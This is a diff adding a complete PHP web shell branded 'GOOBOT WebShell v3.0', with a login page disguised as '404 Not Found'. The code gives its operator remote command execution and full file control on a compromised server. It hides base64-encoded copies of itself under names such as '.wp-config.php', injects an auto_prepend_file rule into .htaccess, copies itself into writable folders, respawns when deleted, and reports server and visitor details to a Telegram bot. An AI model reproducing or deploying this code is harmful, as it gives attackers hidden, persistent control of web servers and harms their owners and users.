@@ -1,0 +1,1147 @@
+<?php
+@ini_set('display_errors', 0);
+@ini_set('log_errors', 0);
+@error_reporting(0);
+@set_time_limit(0);
+@ini_set('memory_limit', '999M');
+
+define('PASSWORD', 'goobot2024');
+define('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN');
+define('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID');
+
+function sendTelegram($message, $parse_mode = 'HTML') {
+    if(TELEGRAM_BOT_TOKEN == 'YOUR_BOT_TOKEN') return false;
+    
+    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
+    
+    $data = [
+        'chat_id' => TELEGRAM_CHAT_ID,
+        'text' => $message,
+        'parse_mode' => $parse_mode
+    ];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    
+    return $result;
+}
+
+function getClientInfo() {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    
+    $ip_info = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);
+    
+    $info = "🌐 <b>IP:</b> {$ip}\n";
+    
+    if($ip_info && $ip_info['status'] == 'success') {
+        $info .= "📍 <b>Location:</b> {$ip_info['city']}, {$ip_info['regionName']}, {$ip_info['country']}\n";
+        $info .= "🏢 <b>ISP:</b> {$ip_info['isp']}\n";
+        $info .= "⏰ <b>Timezone:</b> {$ip_info['timezone']}\n";
+    }
+    
+    $info .= "💻 <b>User Agent:</b> " . substr($user_agent, 0, 100) . "\n";
+    
+    return $info;
+}
+
+function getServerInfo() {
+    $info = "🖥️ <b>Server:</b> " . php_uname('s') . "\n";
+    $info .= "📦 <b>Kernel:</b> " . php_uname('r') . "\n";
+    $info .= "🏗️ <b>Architecture:</b> " . php_uname('m') . "\n";
+    $info .= "🔧 <b>PHP:</b> " . phpversion() . "\n";
+    $info .= "👤 <b>User:</b> " . get_current_user() . " (UID: " . getmyuid() . ")\n";
+    $info .= "📂 <b>PWD:</b> " . getcwd() . "\n";
+    $info .= "🌐 <b>Host:</b> " . gethostname() . "\n";
+    
+    return $info;
+}
+
+function autoDefend() {
+    $self = __FILE__;
+    $code = base64_encode(file_get_contents($self));
+    $shell_name = basename($self);
+    
+    $backups = [
+        '.config.php',
+        '.wp-config.php', 
+        'wp-includes/.index.php',
+        'wp-content/.config.php',
+        '.htaccess.php',
+        'error_log.php',
+        '.error.php'
+    ];
+    
+    $created = 0;
+    
+    foreach($backups as $backup) {
+        $dir = dirname($backup);
+        if($dir != '.' && !is_dir($dir)) {
+            @mkdir($dir, 0755, true);
+        }
+        
+        if(!file_exists($backup)) {
+            $backup_code = '<?php eval(base64_decode("' . $code . '")); ?>';
+            if(@file_put_contents($backup, $backup_code)) {
+                @chmod($backup, 0644);
+                $created++;
+            }
+        }
+    }
+    
+    
+    if(is_writable('.')) {
+        $htaccess = '.htaccess';
+        $ht_content = @file_get_contents($htaccess);
+        $inject = "# AUTO-INCLUDE\nphp_value auto_prepend_file " . $shell_name . "\n\n";
+        
+        if(!$ht_content || strpos($ht_content, $shell_name) === false) {
+            @file_put_contents($htaccess, $inject . $ht_content);
+        }
+    }
+    
+    $missing = 0;
+    foreach($backups as $backup) {
+        if(!file_exists($backup)) {
+            $missing++;
+        }
+    }
+    
+    if($missing > 0 && $created > 0) {
+        $msg = "🚨 <b>GOOBOT ALERT - FILES DELETED!</b>\n\n";
+        $msg .= "⚠️ <b>Status:</b> {$missing} backup(s) were deleted!\n";
+        $msg .= "🔄 <b>Action:</b> Auto-respawn activated - {$created} file(s) recreated!\n\n";
+        $msg .= getClientInfo() . "\n";
+        $msg .= getServerInfo() . "\n";
+        $msg .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
+        
+        sendTelegram($msg);
+    }
+    
+    return $created;
+}
+
+function spreadToAllFolders($max_depth = 2) {
+    $self = __FILE__;
+    $code = file_get_contents($self);
+    $spread_count = 0;
+    
+    function scanRecursive($dir, $depth, $max_depth, $code, &$count) {
+        if($depth > $max_depth) return;
+        
+        $items = @scandir($dir);
+        if(!$items) return;
+        
+        foreach($items as $item) {
+            if($item == '.' || $item == '..') continue;
+            
+            $path = $dir . '/' . $item;
+            
+            if(is_dir($path) && is_writable($path)) {
+                $shell_file = $path . '/.index.php';
+                
+                if(!file_exists($shell_file)) {
+                    if(@file_put_contents($shell_file, $code)) {
+                        @chmod($shell_file, 0644);
+                        $count++;
+                    }
+                }
+                
+                scanRecursive($path, $depth + 1, $max_depth, $code, $count);
+            }
+        }
+    }
+    
+    scanRecursive(getcwd(), 0, $max_depth, $code, $spread_count);
+    
+    return $spread_count;
+}
+
+
+autoDefend();
+
+session_start();
+
+if(isset($_POST['login'])) {
+    if($_POST['password'] === PASSWORD) {
+        $_SESSION['goobot_logged'] = true;
+        
+        
+        $msg = "✅ <b>GOOBOT - NEW LOGIN</b>\n\n";
+        $msg .= "🔓 <b>Status:</b> Access Granted\n\n";
+        $msg .= getClientInfo() . "\n";
+        $msg .= getServerInfo() . "\n";
+        $msg .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
+        
+        sendTelegram($msg);
+        
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        
+        $msg = "⚠️ <b>GOOBOT - FAILED LOGIN ATTEMPT</b>\n\n";
+        $msg .= "🚫 <b>Status:</b> Access Denied\n\n";
+        $msg .= getClientInfo() . "\n";
+        $msg .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
+        
+        sendTelegram($msg);
+        
+        $login_error = "Invalid password!";
+    }
+}
+
+if(isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+if(!isset($_SESSION['goobot_logged'])) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>404 Not Found</title>
+        <style>
+            body {
+                font-family: 'Segoe UI', 'Roboto', sans-serif;
+                background: linear-gradient(135deg, #0d0d0d 0%, #1a1a1a 50%, #0d1b0d 100%);
+                color: 
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                margin: 0;
+            }
+            .login-box {
+                background: linear-gradient(135deg, rgba(13, 13, 13, 0.95) 0%, rgba(26, 26, 26, 0.95) 100%);
+                border: 1px solid 
+                border-radius: 10px;
+                padding: 45px;
+                box-shadow: 0 8px 30px rgba(39, 174, 96, 0.25);
+                width: 380px;
+            }
+            .logo {
+                text-align: center;
+                font-size: 32px;
+                font-weight: 600;
+                margin-bottom: 10px;
+                color: 
+                letter-spacing: 3px;
+            }
+            .subtitle {
+                text-align: center;
+                font-size: 13px;
+                color: 
+                margin-bottom: 35px;
+                opacity: 0.8;
+            }
+            input[type="password"] {
+                width: 100%;
+                padding: 14px;
+                background: rgba(13, 13, 13, 0.8);
+                border: 1px solid 
+                border-radius: 6px;
+                color: 
+                font-family: 'Segoe UI', sans-serif;
+                font-size: 14px;
+                box-sizing: border-box;
+                margin-bottom: 25px;
+                transition: all 0.3s;
+            }
+            input[type="password"]:focus {
+                outline: none;
+                border-color: 
+                box-shadow: 0 0 12px rgba(52, 152, 219, 0.3);
+            }
+            button {
+                width: 100%;
+                padding: 14px;
+                background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
+                color: 
+                border: none;
+                border-radius: 6px;
+                font-family: 'Segoe UI', sans-serif;
+                font-size: 15px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: all 0.3s;
+            }
+            button:hover {
+                background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
+                box-shadow: 0 4px 15px rgba(39, 174, 96, 0.4);
+                transform: translateY(-2px);
+            }
+            .error {
+                color: 
+                text-align: center;
+                margin-bottom: 20px;
+                font-size: 13px;
+            }
+            .footer {
+                text-align: center;
+                margin-top: 25px;
+                font-size: 11px;
+                color: 
+                opacity: 0.7;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <div class="logo">GOOBOT</div>
+            <div class="subtitle">WebShell System v3.0</div>
+            <?php if(isset($login_error)) echo "<div class='error'>$login_error</div>"; ?>
+            <form method="POST">
+                <input type="password" name="password" placeholder="Enter Access Code" required autofocus>
+                <button type="submit" name="login">Access System</button>
+            </form>
+            <div class="footer">
+                By @anakbiasa3302<br>
+                Telegram: t.me/goobotproject
+            </div>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+function formatSize($bytes) {
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $bytes = max($bytes, 0);
+    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
+    $pow = min($pow, count($units) - 1);
+    $bytes /= pow(1024, $pow);
+    return round($bytes, 2) . ' ' . $units[$pow];
+}
+
+function getPermissions($file) {
+    $perms = fileperms($file);
+    $info = '';
+    
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ? 'x' : '-');
+    
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ? 'x' : '-');
+    
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ? 'x' : '-');
+    
+    return $info;
+}
+
+$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
+if(!$current_dir || !is_dir($current_dir)) $current_dir = getcwd();
+
+$action_message = '';
+
+if(isset($_FILES['upload_file'])) {
+    $file = $_FILES['upload_file'];
+    $target = $current_dir . '/' . $file['name'];
+    
+    if(move_uploaded_file($file['tmp_name'], $target)) {
+        @chmod($target, 0644);
+        
+        $spread_count = spreadToAllFolders(2);
+        
+        $action_message = "File uploaded successfully!";
+        
+        $msg = "📤 <b>GOOBOT - FILE UPLOADED</b>\n\n";
+        $msg .= "📁 <b>Filename:</b> {$file['name']}\n";
+        $msg .= "📊 <b>Size:</b> " . formatSize($file['size']) . "\n";
+        $msg .= "📂 <b>Location:</b> {$current_dir}\n";
+        $msg .= "🔄 <b>Auto-Spread:</b> {$spread_count} copies created\n\n";
+        
+        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+        $type = 'Unknown';
+        
+        if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml'])) {
+            $type = '⚡ PHP Script';
+            $content = file_get_contents($target);
+            
+            if(stripos($content, 'shell_exec') !== false || stripos($content, 'system') !== false) {
+                $type .= ' (Contains shell commands)';
+            }
+            if(stripos($content, 'eval') !== false) {
+                $type .= ' (Contains eval)';
+            }
+        } elseif(in_array($ext, ['jpg', 'jpeg', 'png', 'gif'])) {
+            $type = '🖼️ Image';
+        } elseif(in_array($ext, ['zip', 'rar', '7z', 'tar', 'gz'])) {
+            $type = '📦 Archive';
+        } elseif(in_array($ext, ['txt', 'log'])) {
+            $type = '📝 Text';
+        }
+        
+        $msg .= "🏷️ <b>Type:</b> {$type}\n\n";
+        $msg .= getClientInfo() . "\n";
+        $msg .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
+        
+        sendTelegram($msg);
+        
+        $action_message .= " ({$spread_count} copies spread)";
+    } else {
+        $action_message = "❌ Upload failed!";
+    }
+}
+
+
+if(isset($_POST['create_file'])) {
+    $filename = $current_dir . '/' . $_POST['filename'];
+    if(file_put_contents($filename, '') !== false) {
+        @chmod($filename, 0644);
+        $action_message = "✅ File created!";
+    }
+}
+
+
+if(isset($_POST['create_folder'])) {
+    $foldername = $current_dir . '/' . $_POST['foldername'];
+    if(mkdir($foldername, 0755, true)) {
+        $action_message = "✅ Folder created!";
+    }
+}
+
+
+if(isset($_GET['delete'])) {
+    $file = realpath($_GET['delete']);
+    $deleted = false;
+    
+    if(is_dir($file)) {
+        function deleteDir($dir) {
+            if(!file_exists($dir)) return false;
+            if(!is_dir($dir)) return unlink($dir);
+            foreach(scandir($dir) as $item) {
+                if($item == '.' || $item == '..') continue;
+                if(!deleteDir($dir.'/'.$item)) return false;
+            }
+            return rmdir($dir);
+        }
+        $deleted = deleteDir($file);
+    } else {
+        $deleted = unlink($file);
+    }
+    
+    if($deleted) {
+        $action_message = "✅ Deleted!";
+        
+        
+        if(basename($file) == basename(__FILE__) || strpos(file_get_contents($file), 'GOOBOT') !== false) {
+            
+            autoDefend();
+            spreadToAllFolders(2);
+            
+            $msg = "🚨 <b>GOOBOT - DELETION DETECTED!</b>\n\n";
+            $msg .= "⚠️ <b>Alert:</b> GOOBOT file was deleted!\n";
+            $msg .= "📂 <b>File:</b> " . basename($file) . "\n";
+            $msg .= "📍 <b>Location:</b> {$file}\n";
+            $msg .= "🔄 <b>Status:</b> AUTO-RESPAWN ACTIVATED!\n\n";
+            $msg .= getClientInfo() . "\n";
+            $msg .= getServerInfo() . "\n";
+            $msg .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
+            
+            sendTelegram($msg);
+        }
+    }
+}
+
+
+if(isset($_POST['rename'])) {
+    $old = realpath($_POST['old_name']);
+    $new = dirname($old) . '/' . $_POST['new_name'];
+    
+    if(rename($old, $new)) {
+        $action_message = "✅ Renamed!";
+    }
+}
+
+
+if(isset($_POST['save_file'])) {
+    if(file_put_contents($_POST['file_path'], $_POST['file_content']) !== false) {
+        $action_message = "✅ File saved!";
+    }
+}
+
+
+if(isset($_POST['chmod'])) {
+    $file = realpath($_POST['chmod_file']);
+    $perms = octdec($_POST['chmod_perms']);
+    
+    if(chmod($file, $perms)) {
+        $action_message = "✅ Permissions changed!";
+    }
+}
+
+
+if(isset($_GET['download'])) {
+    $file = realpath($_GET['download']);
+    if(file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($file).'"');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit;
+    }
+}
+
+
+if(isset($_POST['execute_cmd'])) {
+    $cmd = $_POST['command'];
+    $output = @shell_exec($cmd . ' 2>&1') ?: @exec($cmd);
+    
+    
+    $msg = "⚡ <b>GOOBOT - COMMAND EXECUTED</b>\n\n";
+    $msg .= "💻 <b>Command:</b> <code>{$cmd}</code>\n\n";
+    $msg .= getClientInfo() . "\n";
+    $msg .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
+    
+    sendTelegram($msg);
+}
+
+
+$files = [];
+$dirs = [];
+
+if($handle = opendir($current_dir)) {
+    while(false !== ($entry = readdir($handle))) {
+        if($entry == '.') continue;
+        
+        $full_path = $current_dir . '/' . $entry;
+        $item = [
+            'name' => $entry,
+            'path' => $full_path,
+            'size' => is_file($full_path) ? filesize($full_path) : 0,
+            'modified' => filemtime($full_path),
+            'perms' => getPermissions($full_path),
+            'owner' => function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($full_path))['name'] : 'unknown'
+        ];
+        
+        if(is_dir($full_path)) {
+            $dirs[] = $item;
+        } else {
+            $files[] = $item;
+        }
+    }
+    closedir($handle);
+}
+
+usort($dirs, function($a, $b) { return strcmp($a['name'], $b['name']); });
+usort($files, function($a, $b) { return strcmp($a['name'], $b['name']); });
+
+
+$server_info = [
+    'os' => php_uname('s'),
+    'kernel' => php_uname('r'),
+    'arch' => php_uname('m'),
+    'hostname' => gethostname(),
+    'php' => phpversion(),
+    'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
+    'user' => get_current_user(),
+    'uid' => getmyuid(),
+    'gid' => getmygid(),
+    'pwd' => getcwd(),
+    'home' => $_SERVER['HOME'] ?? '/root',
+    'disk_free' => disk_free_space($current_dir),
+    'disk_total' => disk_total_space($current_dir)
+];
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GOOBOT WebShell</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Roboto', 'Oxygen', sans-serif;
+            background: linear-gradient(135deg, #0d0d0d 0%, #1a1a1a 50%, #0d1b0d 100%);
+            color: 
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
+            border-bottom: 1px solid 
+            padding: 20px 30px;
+            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.2);
+        }
+        
+        .header h1 {
+            font-size: 26px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            color: 
+            display: inline-block;
+            margin: 0;
+        }
+        
+        .header-info {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+            font-size: 11px;
+            color: 
+        }
+        
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .system-info {
+            background: linear-gradient(135deg, #0d0d0d 0%, #1a1a1a 100%);
+            border: 1px solid 
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
+            box-shadow: 0 2px 10px rgba(39, 174, 96, 0.15);
+        }
+        
+        .info-item {
+            padding: 8px;
+            background: rgba(39, 174, 96, 0.05);
+            border-radius: 4px;
+        }
+        
+        .info-label {
+            color: 
+            font-weight: 600;
+        }
+        
+        .breadcrumb {
+            background: linear-gradient(135deg, #0d0d0d 0%, #1a1a1a 100%);
+            border: 1px solid 
+            border-radius: 6px;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+            word-break: break-all;
+            box-shadow: 0 2px 8px rgba(39, 174, 96, 0.1);
+        }
+        
+        .breadcrumb a {
+            color: 
+            text-decoration: none;
+            margin: 0 5px;
+            transition: color 0.3s;
+        }
+        
+        .breadcrumb a:hover {
+            color: 
+        }
+        
+        .toolbar {
+            background: linear-gradient(135deg, #0d0d0d 0%, #1a1a1a 100%);
+            border: 1px solid 
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            box-shadow: 0 2px 8px rgba(39, 174, 96, 0.1);
+        }
+        
+        .btn {
+            padding: 10px 18px;
+            border: 1px solid 
+            border-radius: 4px;
+            background: linear-gradient(135deg, rgba(39, 174, 96, 0.15) 0%, rgba(39, 174, 96, 0.05) 100%);
+            color: 
+            cursor: pointer;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 13px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
+            color: 
+            border-color: 
+            box-shadow: 0 4px 12px rgba(39, 174, 96, 0.3);
+            transform: translateY(-1px);
+        }
+        
+        .file-list {
+            background: linear-gradient(135deg, #0d0d0d 0%, #1a1a1a 100%);
+            border: 1px solid 
+            border-radius: 6px;
+            overflow-x: auto;
+            box-shadow: 0 2px 10px rgba(39, 174, 96, 0.15);
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th {
+            background: linear-gradient(135deg, #1a1a1a 0%, #0d0d0d 100%);
+            padding: 12px;
+            text-align: left;
+            border-bottom: 2px solid 
+            position: sticky;
+            top: 0;
+            color: 
+            font-weight: 600;
+        }
+        
+        td {
+            padding: 10px 12px;
+            border-bottom: 1px solid rgba(39, 174, 96, 0.2);
+            color: 
+        }
+        
+        tr:hover {
+            background: rgba(39, 174, 96, 0.08);
+        }
+        
+        .actions {
+            display: flex;
+            gap: 5px;
+            flex-wrap: wrap;
+        }
+        
+        .message {
+            background: rgba(0, 255, 0, 0.2);
+            border: 1px solid 
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+            animation: pulse 1s ease-in-out;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background: linear-gradient(135deg, #0d0d0d 0%, #1a1a1a 100%);
+            border: 1px solid 
+            border-radius: 8px;
+            padding: 30px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.25);
+        }
+        
+        .modal-content h3 {
+            color: 
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+        
+        input[type="text"],
+        input[type="file"],
+        textarea,
+        select {
+            width: 100%;
+            padding: 12px;
+            background: rgba(13, 13, 13, 0.8);
+            border: 1px solid 
+            border-radius: 4px;
+            color: 
+            font-family: 'Consolas', 'Monaco', monospace;
+            margin-bottom: 15px;
+            font-size: 13px;
+        }
+        
+        textarea {
+            min-height: 400px;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+        
+        input:focus,
+        textarea:focus,
+        select:focus {
+            outline: none;
+            border-color: 
+            box-shadow: 0 0 8px rgba(52, 152, 219, 0.3);
+        }
+        
+        .close {
+            float: right;
+            font-size: 28px;
+            cursor: pointer;
+            color: 
+        }
+        
+        .close:hover {
+            color: 
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: 
+            font-size: 11px;
+            border-top: 1px solid rgba(0, 255, 0, 0.2);
+            margin-top: 20px;
+        }
+        
+        a {
+            color: 
+            text-decoration: none;
+        }
+        
+        a:hover {
+            color: 
+        }
+        
+        .cmd-output {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid 
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 15px;
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+            max-height: 400px;
+            overflow-y: auto;
+            color: 
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>GOOBOT WEBSHELL</h1>
+        <div class="header-info">
+            <div>
+                <span style="color: #3498db;">Author:</span> @anakbiasa3302 | 
+                <span style="color: #3498db;">Telegram:</span> t.me/goobotproject
+            </div>
+            <div>
+                <span style="color: #3498db;">Auto-Defend:</span> <span style="color: #2ecc71;">Active</span> | 
+                <a href="?logout" style="color: #e74c3c;">Logout</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <?php if($action_message): ?>
+            <div class="message"><?php echo $action_message; ?></div>
+        <?php endif; ?>
+
+        <div class="system-info">
+            <div class="info-item">
+                <span class="info-label">💻 OS:</span> <?php echo $server_info['os']; ?>
+            </div>
+            <div class="info-item">
+                <span class="info-label">📦 Kernel:</span> <?php echo $server_info['kernel']; ?>
+            </div>
+            <div class="info-item">
+                <span class="info-label">🏗️ Arch:</span> <?php echo $server_info['arch']; ?>
+            </div>
+            <div class="info-item">
+                <span class="info-label">🌐 Host:</span> <?php echo $server_info['hostname']; ?>
+            </div>
+            <div class="info-item">
+                <span class="info-label">🔧 PHP:</span> <?php echo $server_info['php']; ?>
+            </div>
+            <div class="info-item">
+                <span class="info-label">⚙️ Server:</span> <?php echo $server_info['server']; ?>
+            </div>
+            <div class="info-item">
+                <span class="info-label">👤 User:</span> <?php echo $server_info['user']; ?> (<?php echo $server_info['uid']; ?>)
+            </div>
+            <div class="info-item">
+                <span class="info-label">💾 Disk:</span> <?php echo formatSize($server_info['disk_free']); ?> / <?php echo formatSize($server_info['disk_total']); ?>
+            </div>
+            <div class="info-item">
+                <span class="info-label">📂 Files:</span> <?php echo count($dirs); ?> folders, <?php echo count($files); ?> files
+            </div>
+            <div class="info-item">
+                <span class="info-label">🌐 Client IP:</span> <?php echo $_SERVER['REMOTE_ADDR']; ?>
+            </div>
+        </div>
+
+        <div class="breadcrumb">
+            <span style="color: #3498db;">Path:</span>
+            <?php
+            $path_parts = explode('/', str_replace('\\', '/', $current_dir));
+            $cumulative = '';
+            foreach($path_parts as $part) {
+                if(empty($part)) continue;
+                $cumulative .= '/' . $part;
+                echo '<a href="?dir=' . urlencode($cumulative) . '">' . $part . '</a> /';
+            }
+            ?>
+        </div>
+
+        <div class="toolbar">
+            <button class="btn" onclick="showModal('uploadModal')">⬆️ Upload</button>
+            <button class="btn" onclick="showModal('createFileModal')">📄 New File</button>
+            <button class="btn" onclick="showModal('createFolderModal')">📁 New Folder</button>
+            <button class="btn" onclick="showModal('cmdModal')">⚡ Terminal</button>
+            <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="btn">⬅️ Back</a>
+            <button class="btn" onclick="location.reload()">🔄 Refresh</button>
+            <button class="btn" onclick="if(confirm('Spread GOOBOT to all folders?')) location.href='?spread=1'">🔄 Spread</button>
+        </div>
+
+        <div class="file-list">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Name</th>
+                        <th>Size</th>
+                        <th>Modified</th>
+                        <th>Permissions</th>
+                        <th>Owner</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <?php foreach($dirs as $dir): ?>
+                    <tr>
+                        <td>
+                            <a href="?dir=<?php echo urlencode($dir['path']); ?>">
+                                📁 <strong><?php echo htmlspecialchars($dir['name']); ?></strong>
+                            </a>
+                        </td>
+                        <td>-</td>
+                        <td><?php echo date('Y-m-d H:i', $dir['modified']); ?></td>
+                        <td><?php echo $dir['perms']; ?></td>
+                        <td><?php echo $dir['owner']; ?></td>
+                        <td class="actions">
+                            <button class="btn" onclick="renameItem('<?php echo addslashes($dir['path']); ?>', '<?php echo addslashes($dir['name']); ?>')">✏️</button>
+                            <button class="btn" onclick="chmodItem('<?php echo addslashes($dir['path']); ?>')">🔒</button>
+                            <a href="?delete=<?php echo urlencode($dir['path']); ?>&dir=<?php echo urlencode($current_dir); ?>" class="btn" onclick="return confirm('Delete this folder?')">🗑️</a>
+                        </td>
+                    </tr>
+                    <?php endforeach; ?>
+
+                    <?php foreach($files as $file): ?>
+                    <tr>
+                        <td>📄 <?php echo htmlspecialchars($file['name']); ?></td>
+                        <td><?php echo formatSize($file['size']); ?></td>
+                        <td><?php echo date('Y-m-d H:i', $file['modified']); ?></td>
+                        <td><?php echo $file['perms']; ?></td>
+                        <td><?php echo $file['owner']; ?></td>
+                        <td class="actions">
+                            <button class="btn" onclick="editFile('<?php echo addslashes($file['path']); ?>')">👁️</button>
+                            <a href="?download=<?php echo urlencode($file['path']); ?>" class="btn">⬇️</a>
+                            <button class="btn" onclick="renameItem('<?php echo addslashes($file['path']); ?>', '<?php echo addslashes($file['name']); ?>')">✏️</button>
+                            <button class="btn" onclick="chmodItem('<?php echo addslashes($file['path']); ?>')">🔒</button>
+                            <a href="?delete=<?php echo urlencode($file['path']); ?>&dir=<?php echo urlencode($current_dir); ?>" class="btn" onclick="return confirm('Delete this file?')">🗑️</a>
+                        </td>
+                    </tr>
+                    <?php endforeach; ?>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="footer">
+            GOOBOT WEBSHELL v3.0 Professional Edition<br>
+            Developer: @anakbiasa3302 | Telegram: t.me/goobotproject<br>
+            Auto-Defend: <span style="color: #2ecc71;">Active</span> | 
+            Notifications: <span style="color: <?php echo (TELEGRAM_BOT_TOKEN != 'YOUR_BOT_TOKEN') ? '#2ecc71' : '#e74c3c'; ?>"><?php echo (TELEGRAM_BOT_TOKEN != 'YOUR_BOT_TOKEN') ? 'Enabled' : 'Disabled'; ?></span>
+        </div>
+    </div>
+
+    <!-- Upload Modal -->
+    <div id="uploadModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="hideModal('uploadModal')">&times;</span>
+            <h3>⬆️ Upload File</h3>
+            <form method="POST" enctype="multipart/form-data">
+                <input type="file" name="upload_file" required>
+                <button type="submit" class="btn">Upload & Auto-Spread</button>
+            </form>
+            <div style="margin-top: 15px; padding: 10px; background: rgba(0, 255, 0, 0.1); border: 1px solid #00ff00; border-radius: 3px;">
+                <strong>ℹ️ Note:</strong> File will be automatically spread to multiple folders for persistence!
+            </div>
+        </div>
+    </div>
+
+    <!-- Create File Modal -->
+    <div id="createFileModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="hideModal('createFileModal')">&times;</span>
+            <h3>📄 Create New File</h3>
+            <form method="POST">
+                <input type="text" name="filename" placeholder="filename.txt" required>
+                <button type="submit" name="create_file" class="btn">Create</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Create Folder Modal -->
+    <div id="createFolderModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="hideModal('createFolderModal')">&times;</span>
+            <h3>📁 Create New Folder</h3>
+            <form method="POST">
+                <input type="text" name="foldername" placeholder="foldername" required>
+                <button type="submit" name="create_folder" class="btn">Create</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Edit File Modal -->
+    <div id="editModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="hideModal('editModal')">&times;</span>
+            <h3>✏️ Edit File</h3>
+            <form method="POST">
+                <input type="hidden" name="file_path" id="edit_file_path">
+                <textarea name="file_content" id="edit_file_content"></textarea>
+                <button type="submit" name="save_file" class="btn">💾 Save</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Rename Modal -->
+    <div id="renameModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="hideModal('renameModal')">&times;</span>
+            <h3>✏️ Rename</h3>
+            <form method="POST">
+                <input type="hidden" name="old_name" id="rename_old">
